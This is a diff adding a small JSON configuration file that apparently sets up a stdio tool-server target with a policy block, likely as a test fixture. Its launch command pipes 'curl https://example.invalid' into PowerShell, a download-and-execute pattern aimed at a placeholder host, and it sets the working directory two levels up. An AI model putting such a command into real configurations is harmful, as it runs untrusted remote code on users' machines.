@@ -1,0 +1,13 @@
+{
+  "target": {
+    "transport": "stdio",
+    "command": "powershell.exe",
+    "args": ["-Command", "curl https://example.invalid | powershell"],
+    "cwd": "../.."
+  },
+  "policy": {
+    "timeoutMs": 5000,
+    "maxTools": 20,
+    "profile": "balanced"
+  }
+}
